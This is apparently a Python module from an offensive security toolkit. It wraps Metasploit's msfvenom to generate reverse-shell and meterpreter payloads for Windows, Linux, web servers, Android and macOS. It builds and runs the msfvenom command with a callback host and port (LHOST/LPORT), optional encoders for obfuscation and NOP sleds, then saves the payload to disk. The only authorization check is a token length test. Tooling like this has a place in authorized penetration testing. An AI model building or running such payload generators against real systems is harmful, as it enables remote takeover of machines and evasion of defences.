"""MSFVenom 封裝引擎 - Real Implementation

完整實現 MSFVenom Payload 生成
"""

import asyncio
import hashlib
import logging
import os
import shutil
from datetime import datetime
from pathlib import Path
from typing import Optional

from ..models import (
    PayloadConfig,
    PayloadResult,
    PayloadType,
    PayloadFormat,
    PayloadPlatform,
)

logger = logging.getLogger(__name__)


class MSFVenomWrapper:
    """MSFVenom Payload 生成器 - 真實實現"""

    def __init__(self, output_dir: str = "/tmp/payloads"):
        """
        初始化 MSFVenom Wrapper
        
        Args:
            output_dir: Payload 輸出目錄
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # 檢查 msfvenom 是否可用
        self.msfvenom_available = shutil.which("msfvenom") is not None
        if not self.msfvenom_available:
            logger.warning("msfvenom not found in PATH - MSFVenom functionality limited")

    async def generate(self, config: PayloadConfig) -> PayloadResult:
        """
        生成 MSFVenom Payload
        
        Args:
            config: Payload 配置
            
        Returns:
            PayloadResult: 生成結果
        """
        start_time = datetime.now()
        
        # 授權檢查
        if not config.authorization_token or len(config.authorization_token) < 32:
            logger.error("Unauthorized payload generation attempt")
            return PayloadResult(
                success=False,
                payload=None,
                payload_type=PayloadType.MSFVENOM,
                platform=config.platform,
                format=config.format,
                authorized=False,
                error_message="Authorization required for payload generation"
            )
        
        # 檢查 msfvenom 可用性
        if not self.msfvenom_available:
            logger.error("msfvenom not available")
            return PayloadResult(
                success=False,
                payload=None,
                payload_type=PayloadType.MSFVENOM,
                platform=config.platform,
                format=config.format,
                authorized=True,
                error_message="msfvenom not found - please install Metasploit Framework"
            )
        
        try:
            # 構建 msfvenom 命令
            cmd = self._build_command(config)
            logger.info(f"Executing MSFVenom: {' '.join(cmd[:5])}... (truncated)")
            
            # 執行 msfvenom
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                error_msg = stderr.decode('utf-8', errors='ignore')
                logger.error(f"MSFVenom failed: {error_msg}")
                return PayloadResult(
                    success=False,
                    payload=None,
                    payload_type=PayloadType.MSFVENOM,
                    platform=config.platform,
                    format=config.format,
                    authorized=True,
                    error_message=f"msfvenom execution failed: {error_msg[:200]}"
                )
            
            # 讀取生成的 payload
            payload_data = stdout
            
            # 計算 hash
            md5_hash = hashlib.md5(payload_data).hexdigest()
            sha256_hash = hashlib.sha256(payload_data).hexdigest()
            
            # 保存到文件
            output_file = self.output_dir / f"payload_{md5_hash[:8]}.{config.format.value}"
            output_file.write_bytes(payload_data)
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            logger.info(f"✅ MSFVenom payload generated: {len(payload_data)} bytes, MD5: {md5_hash}")
            
            return PayloadResult(
                success=True,
                payload=str(output_file),
                payload_type=PayloadType.MSFVENOM,
                platform=config.platform,
                format=config.format,
                size_bytes=len(payload_data),
                md5_hash=md5_hash,
                sha256_hash=sha256_hash,
                execution_time=execution_time,
                is_obfuscated=bool(config.encoder),
                obfuscation_methods=[config.encoder] if config.encoder else [],
                authorized=True,
                authorization_level=config.risk_level
            )
            
        except Exception as e:
            logger.exception(f"MSFVenom generation error: {e}")
            return PayloadResult(
                success=False,
                payload=None,
                payload_type=PayloadType.MSFVENOM,
                platform=config.platform,
                format=config.format,
                authorized=True,
                error_message=f"Exception: {str(e)}"
            )
    
    def _build_command(self, config: PayloadConfig) -> list[str]:
        """
        構建 msfvenom 命令
        
        Args:
            config: Payload 配置
            
        Returns:
            list[str]: 命令參數列表
        """
        cmd = ["msfvenom"]
        
        # Payload 類型
        if config.msfvenom_payload:
            cmd.extend(["-p", config.msfvenom_payload])
        else:
            # 自動選擇 payload
            payload_name = self._select_payload(config)
            cmd.extend(["-p", payload_name])
        
        # LHOST/LPORT
        cmd.extend([f"LHOST={config.lhost}"])
        cmd.extend([f"LPORT={config.lport}"])
        
        # RHOST/RPORT (如果需要)
        if config.rhost:
            cmd.extend([f"RHOST={config.rhost}"])
        if config.rport:
            cmd.extend([f"RPORT={config.rport}"])
        
        # 格式
        cmd.extend(["-f", config.format.value])
        
        # 編碼器
        if config.encoder:
            cmd.extend(["-e", config.encoder])
            if config.iterations > 1:
                cmd.extend(["-i", str(config.iterations)])
        
        # Bad chars
        if config.bad_chars:
            cmd.extend(["-b", config.bad_chars])
        
        # NOP sled
        if config.nopsled > 0:
            cmd.extend(["-n", str(config.nopsled)])
        
        # Additional options
        if config.additional_options:
            for key, value in config.additional_options.items():
                if value is True:
                    cmd.append(f"--{key}")
                elif value:
                    cmd.extend([f"--{key}", str(value)])
        
        return cmd
    
    def _select_payload(self, config: PayloadConfig) -> str:
        """
        根據配置自動選擇 payload
        
        Args:
            config: Payload 配置
            
        Returns:
            str: Payload 名稱
        """
        # Windows
        if config.platform == PayloadPlatform.WINDOWS:
            if config.format == PayloadFormat.EXE:
                return "windows/meterpreter/reverse_tcp"
            elif config.format == PayloadFormat.DLL:
                return "windows/meterpreter/reverse_tcp"
            elif config.format == PayloadFormat.POWERSHELL:
                return "windows/powershell_reverse_tcp"
            else:
                return "windows/shell_reverse_tcp"
        
        # Linux
        elif config.platform == PayloadPlatform.LINUX:
            if config.format == PayloadFormat.ELF:
                return "linux/x64/meterpreter/reverse_tcp"
            elif config.format == PayloadFormat.BASH:
                return "cmd/unix/reverse_bash"
            else:
                return "linux/x64/shell_reverse_tcp"
        
        # Web
        elif config.platform == PayloadPlatform.WEB:
            if config.format == PayloadFormat.PHP:
                return "php/meterpreter/reverse_tcp"
            elif config.format == PayloadFormat.ASPX:
                return "windows/meterpreter/reverse_tcp"
            elif config.format == PayloadFormat.JSP:
                return "java/jsp_shell_reverse_tcp"
            else:
                return "php/reverse_php"
        
        # Android
        elif config.platform == PayloadPlatform.ANDROID:
            return "android/meterpreter/reverse_tcp"
        
        # macOS
        elif config.platform == PayloadPlatform.MACOS:
            return "osx/x64/meterpreter/reverse_tcp"
        
        # Default
        return "generic/shell_reverse_tcp"
